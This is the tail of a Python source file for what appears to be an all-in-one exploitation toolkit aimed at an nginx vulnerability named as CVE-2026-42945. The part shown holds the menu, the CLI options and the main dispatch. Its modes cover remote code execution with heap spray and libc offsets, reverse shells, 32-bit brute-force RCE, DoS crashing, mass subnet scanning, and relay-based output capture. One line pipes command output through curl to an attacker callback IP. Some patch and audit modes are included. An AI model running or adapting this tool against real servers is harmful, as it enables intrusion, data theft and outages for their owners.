            key_path = Prompt.ask("Key path") if use_key else None
            password = None if use_key else Prompt.ask("Password", password=True)
            dry = Confirm.ask("Dry run?", default=False)
            r = patch_server(host, port=22, user=user, password=password,
                           key_path=key_path, dry_run=dry)
            c.print(Panel(json.dumps(r, indent=2)[:800], title="Patch Result"))

        elif choice == "6":
            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                c.print("[red]Invalid target[/]")
                continue
            host, port, vhost, use_ssl = parsed
            with Progress(SpinnerColumn(), transient=True) as p:
                p.add_task("Auditing...", total=None)
                hdrs = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
                paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
                tls = tls_audit(host, port, vhost=vhost)
            c.print(Panel(
                "\n".join(f"{k}: {'✅' if v['present'] else '❌'} {(v.get('value') or '')[:40]}"
                         for k, v in hdrs.items() if isinstance(v, dict)),
                title="Security Headers"
            ))
            found_paths = [p["path"] + " → " + p["status"] for p in paths.get("paths_found", [])]
            if found_paths:
                c.print(Panel("\n".join(found_paths[:10]), title="Paths Found"))
            c.print(f"TLS: {tls}")

        elif choice == "7":
            subnet = Prompt.ask("CIDR subnet", default="192.168.1.0/24")
            port = int(Prompt.ask("Port", default=str(DEFAULT_PORT)))
            output = Prompt.ask("Output file (HTML/JSON)", default="scan_report.html")
            auto_scan(subnet, port, output=output)

        elif choice == "8":
            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                c.print("[red]Invalid target[/]")
                continue
            host, port, vhost, use_ssl = parsed
            size = int(Prompt.ask("Overflow size", default="200"))
            r = mode_dos(host, port, size, vhost=vhost, use_ssl=use_ssl)
            c.print(Panel(json.dumps(r, indent=2), title="DoS Result"))

        elif choice == "9":
            fmt = Prompt.ask("Format", choices=["html", "json"], default="html")
            out = Prompt.ask("Output path", default=f"report.{fmt}")
            data = {"timestamp": str(datetime.now()), "tool": "nginx-rift-super-toolkit",
                    "version": VERSION, "note": "Report generated from interactive mode"}
            if fmt == "html":
                generate_html_scan_report([], out)
            else:
                generate_json_report(data, out)

        elif choice == "10":
            src = Prompt.ask("Target list file (one target per line, or paste targets separated by commas)")
            targets: list[str] = []
            if "," in src and not Path(src).exists():
                targets = [t.strip() for t in src.split(",") if t.strip()]
            else:
                try:
                    targets = Path(src).read_text().splitlines()
                except OSError as e:
                    c.print(f"[red]Cannot read file: {e}[/]")
                    input("\nPress Enter to continue...")
                    c.clear()
                    continue
            output_path = Prompt.ask("Output file (HTML/JSON, blank to skip)", default="")
            workers = int(Prompt.ask("Worker threads", default="20"))
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                          transient=True) as p:
                p.add_task(f"Checking {len(targets)} targets...", total=None)
                results = bulk_fingerprint_check(targets, workers=workers,
                                                 output=output_path or None)
            vuln_count = sum(1 for r in results if r.get("vulnerable"))
            safe_count = sum(1 for r in results if r.get("vulnerable") is False)
            tbl = Table(title=f"Bulk Results — {len(results)} checked", box=rich_box.ROUNDED)
            tbl.add_column("Target",   style="cyan",   no_wrap=True)
            tbl.add_column("nginx",    style="green")
            tbl.add_column("Vuln?",    style="yellow")
            tbl.add_column("CVEs",     style="red")
            tbl.add_column("WAF",      style="magenta")
            for r in sorted(results, key=lambda x: x.get("vulnerable") or False, reverse=True):
                vuln = r.get("vulnerable")
                v_str = "[red]YES[/]" if vuln else ("[green]NO[/]" if vuln is False else "[dim]?[/]")
                cves  = ",".join(r.get("matched_cves") or []) or "-"
                waf   = ",".join(r.get("waf") or []) or "-"
                tbl.add_row(r.get("target","?"), r.get("nginx_version","?"),
                            v_str, cves, waf)
            c.print(tbl)
            c.print(f"  Vulnerable: [red]{vuln_count}[/]   Safe: [green]{safe_count}[/]   "
                    f"Unknown: [dim]{len(results)-vuln_count-safe_count}[/]")

        input("\nPress Enter to continue...")
        c.clear()


# ═══════════════════════════════════════════════════════════════════════
# CLI ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="nginx-rift-super-toolkit.py",
        description="CVE-2026-42945 (NGINX Rift) Super Toolkit — merged from 9 repos",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python nginx-rift-super-toolkit.py --check 192.168.1.100:19321
  python nginx-rift-super-toolkit.py --exploit --host 10.0.0.5 --cmd id
  python nginx-rift-super-toolkit.py --shell --host 10.0.0.5 --lhost 10.0.0.1
  python nginx-rift-super-toolkit.py --auto-scan 192.168.1.0/24 -o report.html
  python nginx-rift-super-toolkit.py --scan-subnet 192.168.1.0/24 --port 19321
  python nginx-rift-super-toolkit.py --bruteforce-32 127.0.0.1:19331 callback.ip
  python nginx-rift-super-toolkit.py --patch 192.168.1.100 --user root --password ...
  python nginx-rift-super-toolkit.py --audit example.com:443
  python nginx-rift-super-toolkit.py --dos --host 127.0.0.1 --port 19321
        """
    )

    # Generic target
    p.add_argument("--host", default="127.0.0.1", help="target host")
    p.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"target port (default {DEFAULT_PORT})")
    p.add_argument("-t", "--target", help="target as host:port (overrides --host/--port)")

    # Modes
    p.add_argument("--check", action="store_true", help="detect-only: fingerprint + vuln pattern check (no overflow)")
    p.add_argument("--exploit", action="store_true", help="full RCE exploitation")
    p.add_argument("--shell", action="store_true", help="reverse shell mode")
    p.add_argument("--dos", action="store_true", help="DoS crash verification")

    # Exploit params
    p.add_argument("--cmd", help="command to execute via system()")
    p.add_argument("--lhost", "--listen-ip", default="172.17.0.1", help="reverse shell listener IP")
    p.add_argument("--lport", "--listen-port", type=int, default=1337, help="reverse shell port")
    p.add_argument("--l2relay", action="store_true",
                   help="L2 relay mode: rev shell connects to external relay, not a local listener")
    p.add_argument("--l2-relay-ip", metavar="IP",
                   help="L2 relay machine IP (Relay IP from gsocket-relay.sh)")
    p.add_argument("--l2-relay-port", type=int, default=12345, metavar="PORT",
                   help="L2 relay port (default: 12345)")
    p.add_argument("--l1-token", metavar="TOKEN", default="",
                   help="L1 GSocket token for display (from gsocket-relay.sh)")
    p.add_argument("--l2-secret", metavar="SECRET", default="",
                   help="L2 local secret for display (from gsocket-relay.sh)")
    p.add_argument("--heap-base", type=parse_int, help=f"heap base (default: {hex(DEFAULT_HEAP_BASE)})")
    p.add_argument("--libc-base", type=parse_int, help=f"libc base (default: {hex(DEFAULT_LIBC_BASE)})")
    p.add_argument("--system-offset", type=parse_int, default=DEFAULT_SYSTEM_OFFSET,
                   help=f"system() offset (default: {hex(DEFAULT_SYSTEM_OFFSET)})")
    p.add_argument("--offsets", type=str, help="comma-separated heap offsets")
    p.add_argument("--tries", type=int, default=10, help="attempts per candidate")
    p.add_argument("--n-spray", type=int, default=N_SPRAY, help="spray body count")
    p.add_argument("--body-len", type=int, default=BODY_LEN, help="spray body length")
    p.add_argument("--no-safe-check", action="store_true", help="skip URI-safe byte filtering")

    # 32-bit brute-force
    p.add_argument("--bruteforce-32", nargs=2, metavar=("TARGET", "CALLBACK_IP"),
                   help="32-bit remote brute-force RCE")

    # Subnet scan
    p.add_argument("--scan-subnet", metavar="CIDR", help="scan CIDR subnet for live hosts")
    p.add_argument("--scan-ssh", action="store_true", help="scan with SSH version detection")
    p.add_argument("--user", default="root", help="SSH user")
    p.add_argument("--password", help="SSH password")
    p.add_argument("--key", "--key-path", dest="key_path", help="SSH private key path")
    p.add_argument("--workers", type=int, default=20, help="scan worker threads")

    # Auto modes
    p.add_argument("--auto-scan", metavar="CIDR", help="auto-scan: discover + fingerprint + report")
    p.add_argument("--auto-patch", metavar="CIDR", help="auto-patch: scan + patch + verify")
    p.add_argument("--auto-exploit", metavar="TARGET", help="auto-exploit: fingerprint + exploit + report")

    # Patch
    p.add_argument("--patch", metavar="HOST", help="SSH remote patching of a single host")
    p.add_argument("--dry-run", action="store_true", help="patch dry-run simulation")

    # Output capture (exploit mode)
    p.add_argument("--gsocket", action="store_true",
                   help="capture RCE output via GSocket/GSRN relay (no public IP required)")
    p.add_argument("--gs-secret", metavar="SECRET",
                   help="GSocket shared secret (auto-generated if omitted)")
    p.add_argument("--gs-relay", metavar="HOST:PORT", default=f"{GSRN_HOST}:{GSRN_PORT}",
                   help=f"GSRN relay address (default: {GSRN_HOST}:{GSRN_PORT})")
    p.add_argument("--callback-ip", metavar="IP",
                   help="HTTP callback IP (direct, requires public IP reachable from target)")
    p.add_argument("--callback-port", type=int, default=9876,
                   help="HTTP callback port (default: 9876)")

    # Bulk check
    p.add_argument("--bulk-check", metavar="FILE",
                   help="bulk fingerprint+vuln check from a target list file (one target per line)")

    # Web audit
    p.add_argument("--audit", metavar="TARGET", help="full web audit (headers, paths, TLS, WAF)")
    p.add_argument("--audit-headers", action="store_true", help="check security headers only")
    p.add_argument("--audit-paths", action="store_true", help="discover interesting paths")

    # Output
    p.add_argument("-o", "--output", help="output file (HTML or JSON)")
    p.add_argument("-j", "--json", action="store_true", help="JSON output mode")
    p.add_argument("--verbose", "-v", action="store_true", help="verbose output")

    return p


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

def main():
    parser = build_parser()
    args = parser.parse_args()

    # If no arguments at all, launch interactive TUI
    if len(sys.argv) == 1:
        run_interactive()
        return 0

    # Resolve target
    host = args.host
    port = args.port
    vhost = host
    use_ssl = (port == 443)
    if args.target:
        parsed = parse_target(args.target)
        if parsed:
            host, port, vhost, use_ssl = parsed

    parsed_offsets = DEFAULT_HEAP_OFFSETS
    if args.offsets:
        parsed_offsets = [parse_int(x.strip()) for x in args.offsets.split(",") if x.strip()]

    heap_base = args.heap_base or DEFAULT_HEAP_BASE
    libc_base = args.libc_base or DEFAULT_LIBC_BASE

    # ── CHECK (detect-only) ──
    if args.check:
        result = mode_check(host, port, vhost=vhost, use_ssl=use_ssl)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            for k, v in result.items():
                print(f"{k}: {v}")
        return 0 if result.get("verdict") and "present" in str(result.get("verdict")) else 1

    # ── 32-bit BRUTE FORCE ──
    if args.bruteforce_32:
        target, cb_ip = args.bruteforce_32
        parsed = parse_target(target)
        if not parsed:
            print("Invalid target for --bruteforce-32. Use host:port format.")
            return 1
        bh, bp, bv, bs = parsed
        result = mode_exploit_32(bh, bp, args.cmd or "id", cb_ip, args.lport,
                                DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
                                DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
                                args.system_offset, DEFAULT_SPRAY_INTERNAL_OFF_32,
                                DEFAULT_N_PLUS_32, vhost=bv, use_ssl=bs)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("success"):
                print(f"[+] RCE CONFIRMED! Output: {result.get('output')}")
            else:
                print(f"[-] Brute-force exhausted: {result.get('attempts_tried', 0)} tries")
        return 0 if result.get("success") else 2

    # ── EXPLOIT ──
    if args.exploit or args.shell or args.l2relay:
        cmd = args.cmd or ""
        if args.l2relay:
            if not args.l2_relay_ip:
                print("--l2relay requires --l2-relay-ip")
                return 1
            cmd = build_l2_payload(args.l2_relay_ip, args.l2_relay_port)
            show_l2relay_panel(
                args.l2_relay_ip, args.l2_relay_port,
                args.l1_token, args.l2_secret, cmd,
            )
        elif args.shell:
            cmd = build_reverse_shell_cmd(args.lhost, args.lport)
        if not cmd:
            print("--exploit requires --cmd, --shell, or --l2relay")
            return 1

        _gs_receiver: GSocketCallbackReceiver | None = None
        _cb_state:    CallbackState | None = None

        if not args.shell:
            if args.gsocket:
                _rh, _, _rp = args.gs_relay.partition(":")
                _gs_receiver = GSocketCallbackReceiver(
                    args.gs_secret or None, _rh, int(_rp) if _rp else GSRN_PORT
                )
                log("Connecting to GSRN relay...", "info")
                if _gs_receiver.start():
                    log(f"GSRN ready  secret={_gs_receiver.secret}", "ok")
                    log(f"gs-netcat target cmd: {_gs_receiver.target_cmd(cmd)}", "info")
                    log(f"openssl fallback:     {_gs_receiver.target_cmd_openssl(cmd)}", "info")
                    cmd = _gs_receiver.target_cmd(cmd)
                else:
                    log("GSRN connect failed — proceeding without output capture", "warn")
                    _gs_receiver = None
            elif args.callback_ip:
                _cb_state = CallbackState()
                _cb_ready = threading.Event()
                threading.Thread(
                    target=_run_callback_listener,
                    args=("0.0.0.0", args.callback_port, _cb_state, _cb_ready),
                    daemon=True,
                ).start()
                _cb_ready.wait(5)
                log(f"HTTP callback listener on :{args.callback_port}", "ok")
                cmd = f"{cmd} | curl -sm5 -d @- http://{args.callback_ip}:{args.callback_port}/rce"

        if args.shell and not args.l2relay:
            t = threading.Thread(target=run_shell_listener, args=(args.lport,), daemon=True)
            t.start()
            time.sleep(0.5)

        result = mode_exploit(host, port, cmd, heap_base, libc_base,
                             args.system_offset, parsed_offsets, args.tries,
                             vhost=vhost, use_ssl=use_ssl)

        # Collect callback output
        if result.success:
            if _gs_receiver:
                log("Waiting for GSocket output (30 s)...", "info")
                result.output = _gs_receiver.wait(30)
                _gs_receiver.stop()
                if not result.output:
                    log("No GSocket output received (timeout)", "warn")
            elif _cb_state:
                log("Waiting for HTTP callback (15 s)...", "info")
                if _cb_state.event.wait(15):
                    result.output = _cb_state.output
                else:
                    log("No HTTP callback received (timeout)", "warn")

        if args.json:
            print(json.dumps({
                "success": result.success, "winning_addr": result.winning_addr,
                "command_sent": result.command_sent, "output": result.output,
                "attempts": result.attempts, "error": result.error,
            }, indent=2))
        else:
            if result.success:
                print(f"[+] RCE CONFIRMED! Command sent: {cmd}")
                print(f"[+] Winning address: {result.winning_addr}")
                if result.output:
                    print(f"[+] Output:\n{result.output}")
            else:
                print(f"[-] Exploit failed: {result.error or 'no crash detected'}")
        return 0 if result.success else 3

    # ── DoS ──
    if args.dos:
        result = mode_dos(host, port, vhost=vhost, use_ssl=use_ssl)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("vulnerable"):
                print("[!] Target appears VULNERABLE (worker crashed + recovered)")
            else:
                print("[*] No crash detected")
        return 1 if result.get("vulnerable") else 0

    # ── SUBNET SCAN ──
    if args.scan_subnet:
        hosts = scan_subnet(args.scan_subnet, port, args.workers)
        results = []
        for h in hosts:
            svc = detect_service(h, port, vhost=h) # vhost is IP for subnet scan
            if svc.get("alive") and args.scan_ssh:
                ssh = scan_ssh(h, user=args.user, password=args.password, key_path=args.key_path)
                svc.update(ssh)
            results.append(svc)
        if args.output:
            if args.output.endswith(".json"):
                generate_json_report({"scan_results": results}, args.output)
            else:
                generate_html_scan_report(results, args.output)
        print_scan_results(results)
        return 0

    # ── PATCH ──
    if args.patch:
        result = patch_server(args.patch, 22, args.user, args.password,
                             args.key_path, args.dry_run)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print(f"[{result['status']}] {args.patch}")
            for step in result.get("steps", []):
                print(f"  {step['step']}: {step['status']} — {step['detail'][:80]}")
        return 0

    # ── AUDIT ──
    if args.audit:
        host, port, vhost, use_ssl = parse_target(args.audit) or (host, port, vhost, use_ssl)
        hdrs = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
        paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
        waf = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
        tls = tls_audit(host, port, vhost=vhost)
        out = {"target": f"{host}:{port}", "vhost": vhost, "use_ssl": use_ssl, "headers": hdrs, "paths": paths, "waf": waf, "tls": tls}

        if args.json:
            print(json.dumps(out, indent=2))
        else:
            if isinstance(hdrs, dict) and "error" not in hdrs:
                for k, v in hdrs.items():
                    if isinstance(v, dict):
                        mark = "✅" if v.get("present") else "❌"
                        val = (v.get("value") or "")[:40]
                        print(f"  {mark} {k}: {val}")
            if waf:
                print(f"  WAF: {', '.join(waf)}")
            if paths.get("paths_found"):
                print(f"  Paths: {len(paths['paths_found'])} found")
            print(f"  TLS: {' '.join(k for k, v in tls.items() if v)}")

        if args.output:
            if args.output.endswith(".json"):
                generate_json_report(out, args.output)
            else:
                generate_html_scan_report([out], args.output)
        return 0

    if args.audit_headers:
        hdrs = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
        for k, v in hdrs.items():
            if isinstance(v, dict):
                val = (v.get("value") or "")[:60]
                print(f"{'✅' if v['present'] else '❌'} {k}: {val}")
        return 0

    if args.audit_paths:
        paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
        for p in paths.get("paths_found", []):
            print(f"  {p['path']:20s} {p['status']}")
        return 0

    # ── AUTO MODES ──
    if args.auto_scan:
        auto_scan(args.auto_scan, port, args.user, args.password, args.key_path, args.output)
        return 0

    if args.auto_patch:
        auto_patch(args.auto_patch, port, args.user, args.password, args.key_path, args.dry_run)
        return 0

    if args.auto_exploit:
        parsed = parse_target(args.auto_exploit)
        if parsed:
            h, p, v, s = parsed
            result = auto_exploit(h, p, args.cmd or "id", heap_base, libc_base,
                                 args.system_offset, parsed_offsets, vhost=v, use_ssl=s)
            if args.output:
                generate_json_report({
                    "target": f"{h}:{p}", "vhost": v, "use_ssl": s, "result": result.success,
                    "winning_addr": result.winning_addr, "error": result.error,
                }, args.output)
        return 0

    # ── BULK CHECK ──
    if args.bulk_check:
        try:
            lines = Path(args.bulk_check).read_text().splitlines()
        except OSError as e:
            print(f"[-] Cannot read bulk-check file: {e}")
            return 1
        results = bulk_fingerprint_check(lines, workers=args.workers, output=args.output)
        if args.json:
            print(json.dumps(results, indent=2, default=str))
        else:
            print_scan_results(results)
            vuln_n = sum(1 for r in results if r.get("vulnerable"))
            safe_n = sum(1 for r in results if r.get("vulnerable") is False)
            print(f"\n[summary] total={len(results)}  vuln={vuln_n}  safe={safe_n}")
        return 1 if any(r.get("vulnerable") for r in results) else 0

    # No mode selected
    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
